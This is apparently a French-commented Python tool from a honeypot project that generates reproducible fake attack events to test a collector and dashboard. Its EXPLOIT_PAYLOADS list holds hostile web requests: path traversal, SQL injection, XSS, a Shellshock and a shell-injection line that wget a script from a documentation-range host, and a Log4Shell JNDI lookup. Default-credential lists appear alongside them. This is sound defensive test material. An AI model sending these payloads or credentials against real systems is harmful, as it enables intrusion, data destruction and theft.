"""Générateur d'événements factices — livrable du sprint 0.

Raison d'être : permettre à la lane front-end de construire le tableau de bord sans
attendre que la capture de la lane back-end fonctionne. Sans lui, les deux lanes
travaillent en série et le projet prend une semaine de retard structurel.

Utilisation :

    # Flux continu vers le collecteur, 5 événements par seconde
    python -m shield.tools.fake_events --rate 5

    # Test de charge de l'objectif F1 : 3 000 événements en 60 secondes
    python -m shield.tools.fake_events --rate 50 --count 3000

    # Écriture dans un fichier JSONL, sans collecteur
    python -m shield.tools.fake_events --count 500 --out sample.jsonl

Le générateur est **reproductible** : à graine égale, la séquence produite est
identique. C'est ce qui permet de rejouer exactement le même scénario pour vérifier
le déterminisme de l'agent défenseur (US-15).
"""

from __future__ import annotations

import argparse
import asyncio
import json
import random
import sys
from collections.abc import Iterator
from datetime import UTC, datetime, timedelta
from ipaddress import IPv4Address
from itertools import count as forever
from pathlib import Path

import httpx

from shield.common.schema import RawEvent, ServiceName

USERNAMES = [
    "root",
    "admin",
    "administrator",
    "user",
    "test",
    "ubuntu",
    "pi",
    "oracle",
    "postgres",
    "ftp",
    "git",
    "jenkins",
    "deploy",
    "backup",
]
PASSWORDS = [
    "123456",
    "password",
    "admin",
    "root",
    "12345678",
    "qwerty",
    "1234",
    "toor",
    "raspberry",
    "",
    "P@ssw0rd",
    "letmein",
    "changeme",
]
CLIENT_BANNERS = [
    b"SSH-2.0-libssh-0.9.6",
    b"SSH-2.0-OpenSSH_8.4p1",
    b"SSH-2.0-Go",
    b"SSH-2.0-PUTTY",
]
HTTP_PROBES = [
    b"GET / HTTP/1.1\r\nHost: x\r\nUser-Agent: Mozilla/5.0 zgrab/0.x\r\n\r\n",
    b"GET / HTTP/1.1\r\nHost: x\r\nUser-Agent: masscan/1.3\r\n\r\n",
    b"HEAD / HTTP/1.0\r\n\r\n",
]
# Exploits tels qu'on les observe réellement sur un honeypot exposé : beaucoup sont
# encodés dans l'URL, pour échapper aux filtres naïfs.
EXPLOIT_PAYLOADS = [
    b"GET /../../../../etc/passwd HTTP/1.1\r\nHost: x\r\n\r\n",
    b"GET /cgi-bin/.%2e/.%2e/.%2e/etc/passwd HTTP/1.1\r\nHost: x\r\n\r\n",
    b"GET /index.php?id=1' or '1'='1 HTTP/1.1\r\nHost: x\r\n\r\n",
    b"GET /index.php?id=1%27%20OR%20%271%27=%271 HTTP/1.1\r\nHost: x\r\n\r\n",
    b"POST /cgi-bin/x HTTP/1.1\r\n\r\n() { :;};wget http://198.51.100.9/m.sh",
    b"GET /?q=union select null,null HTTP/1.1\r\nHost: x\r\n\r\n",
    b"GET /?x=${jndi:ldap://198.51.100.9/a} HTTP/1.1\r\nHost: x\r\n\r\n",
    b"GET /shell?cd+/tmp;rm+-rf+*;wget+http://198.51.100.9/m.sh HTTP/1.1\r\n\r\n",
    b"GET /.env HTTP/1.1\r\nHost: x\r\n\r\n",
    b"GET /?q=%3Cscript%3Ealert(1)%3C/script%3E HTTP/1.1\r\nHost: x\r\n\r\n",
]


def _credentials_payload(service: ServiceName, rng: random.Random, user: str, pwd: str) -> bytes:
    """Ce que chaque leurre reçoit réellement lors d'une tentative d'authentification."""
    if service is ServiceName.HTTP:
        return f"POST /login HTTP/1.1\r\n\r\nusername={user}&password={pwd}".encode()
    if service is ServiceName.FTP:
        return f"USER {user}\r\nPASS {pwd}\r\n".encode()
    return rng.choice(CLIENT_BANNERS) + b"\r\n" + f"{user}:{pwd}".encode()


def _probe_payload(service: ServiceName, rng: random.Random) -> bytes:
    if service is ServiceName.HTTP:
        return rng.choice(HTTP_PROBES)
    if service is ServiceName.FTP:
        return b""
    return rng.choice(CLIENT_BANNERS)


# Plages documentaires (RFC 5737) : jamais de vraie adresse dans un jeu de test.
IP_POOLS = ["192.0.2.", "198.51.100.", "203.0.113."]


def _random_ip(rng: random.Random) -> IPv4Address:
    return IPv4Address(f"{rng.choice(IP_POOLS)}{rng.randint(1, 254)}")


def make_event(rng: random.Random, *, occurred_at: datetime | None = None) -> RawEvent:
    """Produit un événement plausible. Déterministe pour un ``rng`` donné."""
    service = rng.choices([ServiceName.SSH, ServiceName.HTTP, ServiceName.FTP], weights=[6, 3, 1])[
        0
    ]
    kind = rng.choices(["credentials", "probe", "exploit"], weights=[7, 2, 1])[0]

    username = password = ""
    payload = b""

    if kind == "credentials":
        username = rng.choice(USERNAMES)
        password = rng.choice(PASSWORDS)
        payload = _credentials_payload(service, rng, username, password)
    elif kind == "probe":
        payload = _probe_payload(service, rng)
    else:
        # Les charges d'exploitation sont des requêtes web : elles visent le leurre HTTP.
        service = ServiceName.HTTP
        payload = rng.choice(EXPLOIT_PAYLOADS)

    dest_port = {ServiceName.SSH: 22, ServiceName.HTTP: 80, ServiceName.FTP: 21}[service]
    return RawEvent(
        occurred_at=occurred_at or datetime.now(UTC),
        service=service,
        source_ip=_random_ip(rng),
        source_port=rng.randint(1024, 65535),
        dest_port=dest_port,
        username=username,
        password=password,
        payload=payload,
    )


def make_burst(
    rng: random.Random, *, count: int, source_ip: IPv4Address, start: datetime
) -> list[RawEvent]:
    """Produit une rafale depuis une seule adresse — de quoi déclencher R-007/R-008."""
    events = []
    for index in range(count):
        event = make_event(rng, occurred_at=start + timedelta(seconds=index * 0.5))
        events.append(
            event.model_copy(
                update={
                    "source_ip": source_ip,
                    "service": ServiceName.SSH,
                    "dest_port": 22,
                    "username": rng.choice(USERNAMES),
                    "password": rng.choice(PASSWORDS),
                }
            )
        )
    return events


#: Envois simultanés au plus. Au-delà, l'injection attend une réponse : la cadence ne
#: peut plus être tenue, mais la mémoire du générateur reste bornée.
MAX_IN_FLIGHT = 200


async def _post(client: httpx.AsyncClient, url: str, token: str, event: RawEvent) -> bool:
    try:
        response = await client.post(
            url, json=event.model_dump(mode="json"), headers={"X-Ingest-Token": token}
        )
        return response.status_code < 400
    except httpx.HTTPError:
        return False


async def send_paced(
    url: str,
    token: str,
    events: Iterator[RawEvent],
    rate: float,
    *,
    transport: httpx.AsyncBaseTransport | None = None,
) -> tuple[int, int]:
    """Envoie ``events`` cadencés sur l'horloge. Retourne (envoyés, échecs).

    Le *i*-ème envoi part à ``t0 + i / rate``, sans attendre la réponse du précédent.
    Attendre la réponse puis dormir ``1 / rate`` ajoutait la latence du collecteur à
    chaque envoi : le test de charge F1 durait 82 s au lieu de 60, et sous-estimait la
    charge réelle (#55). Les événements sont tirés dans l'ordre : à graine égale, la
    séquence envoyée reste identique.
    """
    interval = 1.0 / rate if rate > 0 else 0.0
    sent = failed = 0
    slots = asyncio.Semaphore(MAX_IN_FLIGHT)
    in_flight: set[asyncio.Task[None]] = set()
    loop = asyncio.get_running_loop()

    async with httpx.AsyncClient(
        timeout=5.0, transport=transport, limits=httpx.Limits(max_connections=MAX_IN_FLIGHT)
    ) as client:

        async def send(event: RawEvent) -> None:
            nonlocal sent, failed
            try:
                ok = await _post(client, url, token, event)
            finally:
                slots.release()
            sent += int(ok)
            failed += int(not ok)
            if (sent + failed) % 100 == 0:
                print(f"envoyés={sent} échecs={failed}", file=sys.stderr)

        start = loop.time()
        for index, event in enumerate(events):
            if interval:
                await asyncio.sleep(max(0.0, start + index * interval - loop.time()))
            await slots.acquire()
            task = asyncio.create_task(send(event))
            in_flight.add(task)
            task.add_done_callback(in_flight.discard)
        await asyncio.gather(*in_flight)
    return sent, failed


async def run(args: argparse.Namespace) -> int:
    rng = random.Random(args.seed)

    if args.out:
        path = Path(args.out)
        with path.open("w", encoding="utf-8") as handle:
            for _ in range(args.count):
                handle.write(json.dumps(make_event(rng).model_dump(mode="json")) + "\n")
        print(f"{args.count} événements écrits dans {path}")
        return 0

    indices = range(args.count) if args.count else forever()
    events = (make_event(rng) for _ in indices)
    sent, failed = await send_paced(args.url, args.token, events, args.rate)
    print(f"terminé — envoyés={sent} échecs={failed}")
    return 0 if failed == 0 else 1


def main() -> int:
    parser = argparse.ArgumentParser(description="Générateur d'événements factices SHIELD")
    parser.add_argument("--url", default="http://localhost:8000/api/v1/ingest")
    parser.add_argument("--token", default="change-me-ingest-token")
    parser.add_argument("--rate", type=float, default=5.0, help="événements par seconde")
    parser.add_argument("--count", type=int, default=0, help="0 = flux continu")
    parser.add_argument("--seed", type=int, default=1337, help="graine, pour la reproductibilité")
    parser.add_argument("--out", help="écrire en JSONL au lieu d'appeler le collecteur")
    return asyncio.run(run(parser.parse_args()))


if __name__ == "__main__":
    raise SystemExit(main())
